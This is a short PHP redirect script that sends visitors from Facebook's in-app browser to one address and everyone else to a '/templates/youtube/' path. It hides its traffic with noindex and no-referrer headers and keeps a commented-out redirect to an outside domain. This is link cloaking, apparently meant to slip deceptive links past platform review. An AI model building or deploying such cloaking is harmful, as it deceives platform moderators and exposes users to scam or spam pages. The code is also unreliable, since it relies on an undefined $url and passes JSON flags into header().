
<?php
header('X-Robots-Tag: noindex, nofollow');
header('Referrer-Policy: no-referrer');

$myString = $_SERVER["HTTP_USER_AGENT"];
$fbApp = array('FBAN','FBAV','FBMD', 'FBSN', 'FBSV','FBID', 'FBSS', 'FBOP');
$iphoneMobile = array('iOS', 'iphone', 'iPhone', 'ios');
$androidMobile = array('android', 'Android');

function strpos_arr($string, $needle) {
    if(!is_array($needle)) $needle = array($needle);
    foreach($needle as $what) {
        if(($pos = strpos($string, $what))!==false) return 'SUCCESS';
    }
    return 'FAIL';
}

if(strpos_arr($myString, $fbApp) == 'SUCCESS'){
$redi = json_encode($url, JSON_HEX_QUOT|JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS); 

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header("Location: ".$url, JSON_HEX_QUOT|JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS, 301);
exit ();
}
else
{
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
//header("Location: https://chooseyoursoul.com/YPy3StW9?dir=main", 301);
header("Location: /templates/youtube/0rg4zibmf", 301);
exit ();
}
?>